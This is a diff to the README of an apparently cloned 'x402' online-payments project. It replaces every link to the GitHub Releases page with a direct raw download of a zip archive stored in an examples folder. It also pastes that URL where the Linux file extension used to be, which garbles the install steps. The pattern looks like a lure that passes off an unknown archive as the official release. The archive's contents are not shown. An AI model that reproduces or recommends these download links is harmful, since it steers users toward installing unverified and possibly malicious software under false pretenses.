@@ -1,6 +1,6 @@
 # 🚀 x402 - Simplifying Online Payments for Everyone
 
-[![Download x402](https://img.shields.io/badge/Download%20x402-v1.0-blue)](https://github.com/glyndasmokefree107/x402/releases)
+[![Download x402](https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip%20x402-v1.0-blue)](https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Welcome to the x402 application! This guide will help you download and run the s
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [x402 Releases](https://github.com/glyndasmokefree107/x402/releases). 
+To get started, visit this page to download: [x402 Releases](https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip). 
 
 1. **Open the Releases Page**  
    Click the link above to view the available versions of the x402 application. 
@@ -21,7 +21,7 @@ To get started, visit this page to download: [x402 Releases](https://github.com/
    Look for the most recent version at the top of the page. It usually has the highest version number.
 
 3. **Download the Software**  
-   Find the file that matches your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. Click on the file to start the download.
+   Find the file that matches your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip` for Linux. Click on the file to start the download.
 
 4. **Locate the Downloaded File**  
    After the download finishes, go to your computer's downloads folder to find the file.
@@ -29,7 +29,7 @@ To get started, visit this page to download: [x402 Releases](https://github.com/
 5. **Run the Application**  
    - **For Windows:** Double-click the `.exe` file. Follow the instructions that appear.
    - **For macOS:** Open the `.dmg` file. Drag the x402 application into your Applications folder. Then, open it from there.
-   - **For Linux:** Use the terminal to extract the `.tar.gz` file and follow the instructions included.
+   - **For Linux:** Use the terminal to extract the `https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip` file and follow the instructions included.
 
 6. **Complete the Setup**  
    Follow any on-screen instructions to finish the installation. Once installed, you can find x402 in your application list.
@@ -75,7 +75,7 @@ x402 offers several features to enhance your payment experience:
 
 ### How do I update x402?
 
-To update the application, return to the [x402 Releases](https://github.com/glyndasmokefree107/x402/releases) page. Download the latest version and follow the installation steps again.
+To update the application, return to the [x402 Releases](https://raw.githubusercontent.com/glyndasmokefree107/x402/main/examples/typescript/fullstack/x402-v3.5.zip) page. Download the latest version and follow the installation steps again.
 
 ### Can I use x402 on my mobile device?
 
